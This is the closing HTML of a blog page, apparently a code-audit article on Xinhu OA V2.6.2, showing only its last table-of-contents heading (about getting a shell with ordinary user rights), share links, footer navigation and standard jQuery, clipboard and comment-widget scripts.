href="#%E4%BF%A1%E5%91%BCOA%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90getshell"><span class="toc-number">7.</span> <span class="toc-text">信呼OA普通用户权限getshell</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&text=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&title=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&is_video=false&description=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【代码审计】信呼OA V2.6.2 代码审计&body=Check out this article: https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&title=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&title=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&title=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&title=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&name=【代码审计】信呼OA V2.6.2 代码审计&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/&t=【代码审计】信呼OA V2.6.2 代码审计"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    g0dam
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'owner/githubrepo';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
